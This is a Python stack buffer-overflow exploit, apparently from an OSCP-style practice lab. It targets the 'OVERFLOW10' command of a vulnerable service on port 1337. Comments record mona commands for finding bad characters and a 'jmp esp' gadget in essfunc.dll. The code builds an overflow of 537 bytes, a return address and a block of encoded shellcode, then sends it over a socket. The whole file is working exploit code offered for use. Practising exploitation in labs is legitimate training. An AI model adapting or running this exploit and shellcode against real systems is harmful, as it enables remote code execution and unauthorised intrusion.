import socket

#!mona bytearray -b "\x00"

#!mona compare -f C:\mona\oscp\bytearray.bin -a 019AFA30

#!mona bytearray -b "\x00\x07\x2e\xa0\xad\xbe\xde\xef" 

#!mona jmp -r esp -cpb "\x00\x07\x2e\xa0\xad\xbe\xde\xef"

#Log data, item 11 Address=625011AF Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

# 62 50 11 af \xaf\x11\x50\62
# try another JMP address 62 50 11 eb \xeb\x11\x50\x62
#another JMP 62 50 11 bb \xbb\x11\x50\x62


ip = "10.10.83.19"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xbb\x11\x50\x62"
padding = ""
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xfc\xc9\xdc\x0d\x83\xee\xfc\xe2\xf4\x00\x21\x5e\x0d"
"\xfc\xc9\xbc\x84\x19\xf8\x1c\x69\x77\x99\xec\x86\xae\xc5"
"\x57\x5f\xe8\x42\xae\x25\xf3\x7e\x96\x2b\xcd\x36\x70\x31"
"\x9d\xb5\xde\x21\xdc\x08\x13\x00\xfd\x0e\x3e\xff\xae\x9e"
"\x57\x5f\xec\x42\x96\x31\x77\x85\xcd\x75\x1f\x81\xdd\xdc"
"\xad\x42\x85\x2d\xfd\x1a\x57\x44\xe4\x2a\xe6\x44\x77\xfd"
"\x57\x0c\x2a\xf8\x23\xa1\x3d\x06\xd1\x0c\x3b\xf1\x3c\x78"
"\x0a\xca\xa1\xf5\xc7\xb4\xf8\x78\x18\x91\x57\x55\xd8\xc8"
"\x0f\x6b\x77\xc5\x97\x86\xa4\xd5\xdd\xde\x77\xcd\x57\x0c"
"\x2c\x40\x98\x29\xd8\x92\x87\x6c\xa5\x93\x8d\xf2\x1c\x96"
"\x83\x57\x77\xdb\x37\x80\xa1\xa1\xef\x3f\xfc\xc9\xb4\x7a"
"\x8f\xfb\x83\x59\x94\x85\xab\x2b\xfb\x36\x09\xb5\x6c\xc8"
"\xdc\x0d\xd5\x0d\x88\x5d\x94\xe0\x5c\x66\xfc\x36\x09\x5d"
"\xac\x99\x8c\x4d\xac\x89\x8c\x65\x16\xc6\x03\xed\x03\x1c"
"\x4b\x67\xf9\xa1\xd6\x05\x25\xff\xb4\x0f\xfc\xd8\x80\x84"
"\x1a\xa3\xcc\x5b\xab\xa1\x45\xa8\x88\xa8\x23\xd8\x79\x09"
"\xa8\x01\x03\x87\xd4\x78\x10\xa1\x2c\xb8\x5e\x9f\x23\xd8"
"\x94\xaa\xb1\x69\xfc\x40\x3f\x5a\xab\x9e\xed\xfb\x96\xdb"
"\x85\x5b\x1e\x34\xba\xca\xb8\xed\xe0\x0c\xfd\x44\x98\x29"
"\xec\x0f\xdc\x49\xa8\x99\x8a\x5b\xaa\x8f\x8a\x43\xaa\x9f"
"\x8f\x5b\x94\xb0\x10\x32\x7a\x36\x09\x84\x1c\x87\x8a\x4b"
"\x03\xf9\xb4\x05\x7b\xd4\xbc\xf2\x29\x72\x3c\x10\xd6\xc3"
"\xb4\xab\x69\x74\x41\xf2\x29\xf5\xda\x71\xf6\x49\x27\xed"
"\x89\xcc\x67\x4a\xef\xbb\xb3\x67\xfc\x9a\x23\xd8")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
